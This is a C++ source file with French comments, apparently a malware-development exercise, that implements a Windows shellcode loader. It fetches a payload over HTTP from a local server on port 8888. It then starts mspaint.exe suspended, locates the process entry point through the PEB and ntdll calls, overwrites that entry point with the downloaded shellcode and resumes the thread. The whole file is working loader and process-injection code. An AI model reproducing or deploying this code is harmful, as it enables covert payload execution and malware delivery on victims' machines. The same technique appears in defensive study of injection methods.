#include <iostream>
#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <winternl.h>

typedef HMODULE(WINAPI* LoadLibraryFn)(LPCSTR lpLibFileName);
typedef HINTERNET(NTAPI* _WinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
typedef HINTERNET(NTAPI* _WinHttpOpenRequest)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR ppwszAcceptTypes, DWORD dwFlags);
typedef HINTERNET(WINAPI* WINHTTPOPEN)(LPCWSTR pwszUserAgent, DWORD dwAccessType, LPCWSTR pwszProxyName, LPCWSTR pwszProxyBypass, DWORD dwFlags);
typedef HINTERNET(WINAPI* WINHTTPCONNECT)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
typedef HINTERNET(WINAPI* WINHTTPOPENREQUEST)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags);
typedef HINTERNET(NTAPI* _WinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
typedef BOOL(NTAPI* _WinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
typedef BOOL(NTAPI* _WinHttpSendRequest)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
typedef BOOL(NTAPI* _WinHttpReceiveResponse)(HINTERNET hRequest, LPVOID lpReserved);
typedef BOOL(NTAPI* _WinHttpQueryDataAvailable)(IN LPVOID hRequest, OUT LPVOID lpdwNumberOfBytesAvailable);
typedef BOOL(NTAPI* _WinHttpCloseHandle)(IN LPVOID hInternet);
typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(OUT HANDLE ProcessHandle, IN  PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN  ULONG ProcessInformationLength, OUT PULONG ReturnLength);
typedef BOOL(NTAPI* _NtReadVirtualMemory)(IN HANDLE ProcessHandle, IN PVOID BaseAddress, OUT PVOID Buffer, IN  ULONG NumberOfBytesToRead, OUT PULONG NumberOfBytesReaded);
typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(IN HANDLE ProcessHandle,IN PVOID BaseAddress, IN PVOID Buffer, IN ULONG NumberOfBytesToWrite, OUT PULONG NumberOfBytesWritten OPTIONAL);
typedef NTSTATUS(NTAPI* _NtResumeThread)(IN HANDLE ThreadHandle, OUT PULONG SuspendCount OPTIONAL);

PUCHAR shell;
DWORD sizeOfShell = 0;


// Fonction pour calculer le Hash SHA-256 d'une chaîne de caractères
bool CalculateSHA256Hash(const char* input, DWORD inputSize, BYTE* hashBuffer) {
    HCRYPTPROV hProv = NULL;
    HCRYPTHASH hHash = NULL;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        std::cerr << "Impossible d'acquérir le contexte de chiffrement" << std::endl;
        return false;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        std::cerr << "Impossible de créer le hachage" << std::endl;
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptHashData(hHash, reinterpret_cast<const BYTE*>(input), inputSize, 0)) {
        std::cerr << "Impossible de mettre en hachage les données" << std::endl;
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    DWORD hashSize = 32;
    if (!CryptGetHashParam(hHash, HP_HASHVAL, hashBuffer, &hashSize, 0)) {
        std::cerr << "Impossible d'obtenir le hachage" << std::endl;
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    return true;
}



int Hash(const char* inputData) {
    DWORD inputSize = strlen(inputData);
    BYTE hashBuffer[32]; // Résultat du hash

    if (CalculateSHA256Hash(inputData, inputSize, hashBuffer)) {
        std::cout << "Hachage SHA-256 de '" << inputData << "': \n";
        for (int i = 0; i < 32; i++) {
            printf("%02x", hashBuffer[i]);
        }
        std::cout << std::endl;
    }

    else {
        std::cerr << "Erreur lors du calcul du hachage" << std::endl;
        return 1;
    }

}




int main() {

    HMODULE winhttp = LoadLibraryA("winhttp.dll");
    _WinHttpOpen WinHttpOpen = (_WinHttpOpen)GetProcAddress(winhttp, "WinHttpOpen");
    _WinHttpConnect WinHttpConnect = (_WinHttpConnect)GetProcAddress(winhttp, "WinHttpConnect");
    _WinHttpOpenRequest WinHttpOpenRequest = (_WinHttpOpenRequest)GetProcAddress(winhttp, "WinHttpOpenRequest");
    _WinHttpReadData WinHttpReadData = (_WinHttpReadData)GetProcAddress(winhttp, "WinHttpReadData");
    _WinHttpReceiveResponse WinHttpReceiveResponse = (_WinHttpReceiveResponse)GetProcAddress(winhttp, "WinHttpReceiveResponse");
    _WinHttpSendRequest WinHttpSendRequest = (_WinHttpSendRequest)GetProcAddress(winhttp, "WinHttpSendRequest");
    _WinHttpQueryDataAvailable WinHttpQueryDataAvailable = (_WinHttpQueryDataAvailable)GetProcAddress(winhttp, "WinHttpQueryDataAvailable");
    _WinHttpCloseHandle WinHttpCloseHandle = (_WinHttpCloseHandle)GetProcAddress(winhttp, "WinHttpCloseHandle");

    LPCSTR dllName = "kernel32.dll";

    // Charge la bibliothèque kernel32.dll
    HMODULE kernel32 = GetModuleHandle(L"kernel32.dll");
    if (!kernel32) {
        std::cerr << "Impossible de charger kernel32.dll" << std::endl;
        return 1;
    }

    // Récupére l'adresse de la fonction LoadLibraryA depuis kernel32.dll
    LoadLibraryFn loadLibrary = reinterpret_cast<LoadLibraryFn>(GetProcAddress(kernel32, "LoadLibraryA"));
    if (!loadLibrary) {
        std::cerr << "Impossible de récupérer l'adresse de LoadLibraryA" << std::endl;
        return 1;
    }

    // Charge la DLL
    HMODULE loadedDll = loadLibrary(dllName);
    if (!loadedDll) {
        std::cerr << "Impossible de charger la DLL : " << dllName << std::endl;
        return 1;
    }

    std::cout << "DLL chargee avec succes." << std::endl;

    // Libère la DLL
    FreeLibrary(loadedDll);

    // Test la fonction de hashage
    const char* inputData = "Le developpement de Malware c'est genial";
    Hash(inputData);

    // Récupération du Payload
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    hSession = WinHttpOpen(L"WinHTTP Example/1.0", 0, NULL, NULL, 0);

    if (!hSession)
        printf("Error %d has occurred\n", GetLastError());

    // HTTP server
    if (hSession)
        hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8888, 0);

    // HTTP request
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/download", NULL, NULL, NULL, NULL);

    // Envoi de la demande HTTP.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);

    // Attente de la réponse du serveur
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Vérif données disponibles
    dwSize = 0;
    if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
        printf("Error %u in WinHttpQueryDataAvailable.\n",
            GetLastError());

    shell = (PUCHAR)malloc(dwSize + 1);
    if (!WinHttpReadData(hRequest, shell, dwSize, &sizeOfShell))
        printf("Error %u in WinHttpReadData.\n", GetLastError());


    if (!bResults)
        printf("Error %d has occurred.\n", GetLastError());

    // Fermeture des handles
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    NTSTATUS status = 0;
    DWORD error = 0;

    //Chargement de la ntdll
    HANDLE hThread;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    if (!hNtdll)
    {
        printf("[-] Error in retrieving ntdll.dll\r\n");
        return 0;
    }

    //Initialisation des fonctions de la ntdll
    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    _NtReadVirtualMemory NtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    _NtResumeThread NtResumeThread = (_NtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");

    if (!NtQueryInformationProcess || !NtReadVirtualMemory || !NtWriteVirtualMemory || !NtResumeThread)
    {
        printf("[-] Error in load function\r\n");
        return 0;
    }

    // Création du process pour la payload
    wchar_t commandLineArg[] = L"mspaint.exe";

    STARTUPINFOW si{ 0 };
    PROCESS_INFORMATION pi{ 0 };
    PROCESS_BASIC_INFORMATION pbi{ 0 };

    DWORD returnLenght = 0;

    BOOL createProcess = CreateProcessW(NULL, commandLineArg, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (status != 0)
    {

        error = GetLastError();
        printf("[-] Error create process: %x\r\n", error);
        return 0;
    }
    printf("[*] Process create\r\n");



    // Récupération de la PebBaseAddress
    status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght);

    if (status != 0)
    {
        error = GetLastError();
        printf("[-] Error get information process: %x\r\n", error);
        return 0;
    }
    printf("[*] Get information process\r\n", status);


    PVOID pebImageAddr = PBYTE(pbi.PebBaseAddress) + 0x10;
    LPVOID destImageBase = 0;
    PULONG bytesRead = NULL;

    // Récupération de l'adresse du process
    status = NtReadVirtualMemory(pi.hProcess, pebImageAddr, &destImageBase, sizeof(PVOID), bytesRead);

    if (status != 0)
    {
        error = GetLastError();
        printf("[-] Error read process 1: %x\r\n", error);
        return 0;
    }
    printf("[*] Read process 1\r\n", status);


    CHAR ExfiltredImage[0x200] = { 0 };


    // Récupération de l'image du process
    status = NtReadVirtualMemory(pi.hProcess, destImageBase, &ExfiltredImage, 0x200, bytesRead);


    if (status != 0)
    {
        error = GetLastError();
        printf("[-] Error read process 2: %x\r\n", error);
        return 0;
    }

    printf("[*] Read process 2\r\n", status);

    PIMAGE_DOS_HEADER pimage_mem = (PIMAGE_DOS_HEADER)ExfiltredImage;

    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((PBYTE)ExfiltredImage + pimage_mem->e_lfanew);

    PVOID entryPoint = ((PBYTE)destImageBase + nt_header->OptionalHeader.AddressOfEntryPoint);

    // Ecriture de la payload dans l'entrypoint

    status = WriteProcessMemory(pi.hProcess, entryPoint, shell, sizeOfShell, 0);

    if (status == 0)
    {
        error = GetLastError();
        printf("[-] Error write virtual memory: %x\r\n", error);
        return 0;
    }
    printf("[*] Write memory\r\n", status);


    // Redémmarage du thread
    status = NtResumeThread(pi.hThread, 0);
    if (status != 0)
    {
        error = GetLastError();
        printf("[-] Error Resume Thread: %x\r\n", error);
        return 0;
    }
    printf("[*] Thread resume\r\n", status);


    return 0;
}
